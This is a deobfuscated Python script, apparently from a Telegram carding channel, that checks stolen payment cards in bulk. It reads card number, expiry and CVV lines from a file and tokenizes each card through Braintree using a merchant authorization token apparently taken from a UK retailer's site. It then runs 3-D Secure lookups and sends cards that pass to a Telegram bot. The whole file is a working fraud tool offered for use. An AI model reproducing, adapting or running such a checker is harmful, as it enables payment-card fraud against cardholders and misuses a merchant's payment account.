#  Deobf by Joker_obf
# file name: [Cнєcк Cαя∂ [ Vвν ].py] (py - 3.11)

import requests,time,webbrowser,json,os,sys
from cfonts import render, say
import random,string,user_agent
from fake_useragent import UserAgent
#from bin_info_v1 import bin_info
#from bin_info_v1 import bin_info

user = user_agent.generate_user_agent()
	
r = requests.session()
	
r.follow_redirects = True
	
r.verify = False

Z =  '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'
w = '\033[2;37m'
y = '\033[1;34m' 



md1 = '\x1b[1;31m'  # أحمر
md2 = '\x1b[1;32m'  # أخضر
md3 = '\x1b[38;5;153m'
a5 = '\x1b[38;5;208m'
Z =  '\033[1;31m' 
F = '\033[2;32m' 
B = '\033[2;36m'
X = '\033[1;33m' 
C = '\033[2;35m'
a1 = '\x1b[1;31m'  # أحمر
a2 = '\x1b[1;34m'  # أزرق
a3 = '\x1b[1;32m'  # أخضر
a4 = '\x1b[1;33m'  # أصفر
a5 = '\x1b[38;5;208m'  # برتقالي
a6 = '\x1b[38;5;5m'  # أرجواني
a7 = '\x1b[38;5;13m'  # وردي
a8 = '\x1b[1;30m'  # أسود
a9 = '\x1b[1;37m'  # أبيض
E = '\033[1;31m'
B = '\033[2;36m'
G = '\033[1;32m'
S = '\033[1;33m'
F = '\033[1;32m'  # Ø§Ø®Ø¶Ø±
B = "\033[1;30m"  # Black
R = "\033[1;31m"  # Red
G = "\033[1;32m"  # Green
Y = "\033[1;33m"  # Yellow
Bl = "\033[1;34m"  # Blue
P = "\033[1;35m"  # Purple
C = "\033[1;36m"  # Cyan
W = "\033[1;37m"  # White
PN = "\033[1;35m"  # PINK

import sys,time,os
def lo(word):
    heron = ["[\x1b[1;91m■\x1b[0m□□□□□□□□□]","[\x1b[1;92m■■\x1b[0m□□□□□□□□]", "[\x1b[1;93m■■■\x1b[0m□□□□□□□]", "[\x1b[1;94m■■■■\x1b[0m□□□□□□]", "[\x1b[1;95m■■■■■\x1b[0m□□□□□]", "[\x1b[1;96m■■■■■■\x1b[0m□□□□]", "[\x1b[1;97m■■■■■■■\x1b[0m□□□]", "[\x1b[1;98m■■■■■■■■\x1b[0m□□]", "[\x1b[1;99m■■■■■■■■■\x1b[0m□]", "[\x1b[1;910m■■■■■■■■■■\x1b[0m]"]
    for i in range(5):
        for x in range(len(heron)):
            sys.stdout.write(('\r{}{}').format(str(word), heron[x]))
            time.sleep(0.1)
            sys.stdout.flush()
lo(" \x1b[1;36m      𝐖𝐚𝐢𝐭.𝐅𝐨𝐫 𝐀𝐜𝐭𝐢𝐯𝐢𝐭𝐚𝐭𝐢𝐨𝐧... ")
os.system('clear')            
from cfonts import render  
output = render('JOKER', colors=['white', 'blue'], align='center')
print(output)
print("      ~ DECODE BY • JOKER • -> @Theyhates_joker | Cнαиияℓ : @JokerToolzz ~")


combo = input('         Eитєя Yσυя Cσмвσ Nαмє -> ')
#time.sleep = input('                Eитєя Yσυя Tιмє -> ')
ID = input('                Eитєя Yσυя I∂ Tєℓєgяѕм -> ')
token = input('                     Eитєя Yσυя Tσкєи Tєℓєgяѕм -> ')

webbrowser.open('https://t.me/JokerToolzz')
file=open(f'{combo}.txt',"+r")
start_num = 0
for P in file.readlines():
    start_num += 1
    n = P.split('|')[0]
    bin3=n[:6]
    mm=P.split('|')[1]
    if int(mm) == 12 or int(mm) == 11 or int(mm) == 10:
    	mm = mm
    elif '0' not in mm:
    	mm = f'0{mm}'
    else:
    	mm = mm
    yy=P.split('|')[2]
    cvc=P.split('|')[3].replace('\n', '')
    P=P.replace('\n', '')	
    if "20" not in yy:
        yy = f'20{yy}'
    else:
    	yy = yy
    time.sleep(2)
	
    headers = {
	    'authority': 'payments.braintree-api.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9,ar-DZ;q=0.8,ar;q=0.7',
	    'authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTc4NTQwNDYsImp0aSI6ImQ1NGNjNjY5LTZlMjItNGIxZC05ZjRjLThmZTdiYjc0ZDY5MiIsInN1YiI6ImpwZnk4aGg5dHZka3RrN3oiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImpwZnk4aGg5dHZka3RrN3oiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6IkRpcmVjdFdhdGVyVGFua3NVa0dCUCJ9fQ.h972GlifwSDdWLZ1effWSghZSsmffp4a9q2xBXhccMqAPWpaQ7k6S-S6K4F_VmX1SvM2g8l2YhPuvzt8ru66jA',
	    'braintree-version': '2018-05-10',
	    'content-type': 'application/json',
	    'origin': 'https://assets.braintreegateway.com',
	    'referer': 'https://assets.braintreegateway.com/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': user,
	}
	
    json_data = {
	    'clientSdkMetadata': {
	        'source': 'client',
	        'integration': 'custom',
	        'sessionId': 'af5dea3e-6a58-48ba-807c-681bbdcb54cf',
	    },
	    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
	    'variables': {
	        'input': {
	            'creditCard': {
	                'number': n,
	                'expirationMonth': mm,
	                'expirationYear': yy,
	                'cvv': cvc,
	            },
	            'options': {
	                'validate': False,
	            },
	        },
	    },
	    'operationName': 'TokenizeCreditCard',
	}
	
    response = requests.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
	
    token = (response.json()['data']['tokenizeCreditCard']['token'])
	
	
    headers = {
	    'authority': 'api.braintreegateway.com',
	    'accept': '*/*',
	    'accept-language': 'en-US,en;q=0.9,ar-DZ;q=0.8,ar;q=0.7',
	    'content-type': 'application/json',
	    'origin': 'https://www.directwatertanks.co.uk',
	    'referer': 'https://www.directwatertanks.co.uk/',
	    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
	    'sec-ch-ua-mobile': '?1',
	    'sec-ch-ua-platform': '"Android"',
	    'sec-fetch-dest': 'empty',
	    'sec-fetch-mode': 'cors',
	    'sec-fetch-site': 'cross-site',
	    'user-agent': user,
	}
	
    json_data = {
	    'amount': '28.45',
	    'additionalInfo': {
	        'billingLine1': '65 Main Rd',
	        'billingLine2': '',
	        'billingCity': 'Banbury',
	        'billingPostalCode': 'OX17 2LU',
	        'billingCountryCode': 'GB',
	        'billingPhoneNumber': '01295 711723',
	        'billingGivenName': '\\u0053\\u0061\\u006c\\u0061\\u0068',
	        'billingSurname': '\\u0042\\u0065\\u0072\\u0067\\u0065\\u0073',
	    },
	    'challengeRequested': True,
	    'bin': '525412',
	    'dfReferenceId': '0_0e0e5ef9-03a9-494b-857f-01b7a3e4fb5b',
	    'clientMetadata': {
	        'requestedThreeDSecureVersion': '2',
	        'sdkVersion': 'web/3.94.0',
	        'cardinalDeviceDataCollectionTimeElapsed': 238,
	        'issuerDeviceDataCollectionTimeElapsed': 3006,
	        'issuerDeviceDataCollectionResult': True,
	    },
	    'authorizationFingerprint': 'eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6Imh0dHBzOi8vYXBpLmJyYWludHJlZWdhdGV3YXkuY29tIn0.eyJleHAiOjE3MTc4NTQwNDYsImp0aSI6ImQ1NGNjNjY5LTZlMjItNGIxZC05ZjRjLThmZTdiYjc0ZDY5MiIsInN1YiI6ImpwZnk4aGg5dHZka3RrN3oiLCJpc3MiOiJodHRwczovL2FwaS5icmFpbnRyZWVnYXRld2F5LmNvbSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImpwZnk4aGg5dHZka3RrN3oiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwic2NvcGUiOlsiQnJhaW50cmVlOlZhdWx0Il0sIm9wdGlvbnMiOnsibWVyY2hhbnRfYWNjb3VudF9pZCI6IkRpcmVjdFdhdGVyVGFua3NVa0dCUCJ9fQ.h972GlifwSDdWLZ1effWSghZSsmffp4a9q2xBXhccMqAPWpaQ7k6S-S6K4F_VmX1SvM2g8l2YhPuvzt8ru66jA',
	    'braintreeLibraryVersion': 'braintree/web/3.94.0',
	    '_meta': {
	        'merchantAppId': 'www.directwatertanks.co.uk',
	        'platform': 'web',
	        'sdkVersion': '3.94.0',
	        'source': 'client',
	        'integration': 'custom',
	        'integrationType': 'custom',
	        'sessionId': 'af5dea3e-6a58-48ba-807c-681bbdcb54cf',
	    },
	}
	
    response = requests.post(
	    f'https://api.braintreegateway.com/merchants/jpfy8hh9tvdktk7z/client_api/v1/payment_methods/{token}/three_d_secure/lookup',
	    headers=headers,
	    json=json_data,
	)
	
	#print(P,'->',response.json())
	#msg = (P,'->',response.json())
	
    if 'lookup_card_error' in response.text:
	    print(a9 + f"{P} -> Lookup Card Error ⛔  ")
		
    elif 'authenticate_rejected' in response.text:
	    print(a2 + f"{P} -> authenticate rejected 🚫  ")
	
    elif 'authenticate_attempt_successful' in response.text:
	    msg = (a3 + f"{P} -> Authenticate Attempt Successful ✅")
	    print(msg)
	    with open('𝖓𝖔 𝖛𝖇𝖛 𝖁𝖎𝖘𝖆 ( 𝕬𝖚𝖙𝖍𝖗𝖓𝖙𝖎𝖈𝖆𝖙𝖊 𝕬𝖙𝖙𝖊𝖒𝖕𝖙 𝕾𝖚𝖈𝖈𝖊𝖘𝖘𝖋𝖚𝖑 ).txt','a') as x:
    		x.write(f'{msg}\n')
	    requests.post(f"https://api.telegram.org/bot{token}/sendmessage?chat_id={ID}&text={P} ->  Authenticate Attempt Successful ✅ ")
	    
    elif 'challenge_required' in response.text:
	    print(a1 + f"{P} -> Challenge Required ❌  ")
	
    elif 'authenticate_successful' in response.text:
	    msg2 = (a3 + f"{P} -> Authenticate Successful ✅")
	    print(msg2)
	    with open('𝖓𝖔 𝖛𝖇𝖛 𝖁𝖎𝖘𝖆 ( 𝕬𝖚𝖙𝖍𝖗𝖓𝖙𝖎𝖈𝖆𝖙𝖊 𝕾𝖚𝖈𝖈𝖊𝖘𝖘𝖋𝖚𝖑 ).txt','a') as x:
    		x.write(f'{msg2}\n')
	    requests.post(f"https://api.telegram.org/bot{token}/sendmessage?chat_id={ID}&text={P} ->  Authenticate Attempt Successful ✅ ")
	    
		
    elif 'lookup_error' in response.text:
	    print(a9 + f"{P} -> Lookup Error ⛔  ")
		
    elif 'authenticate_frictionless_failed' in response.text:
	    print(a2 + f"{P} -> authenticate frictionless failed ❌  ")
	    
    elif 'unknown_error' in response.text:
	    print(a4 + f"{P} -> Unknown Error ⚠️  ")
		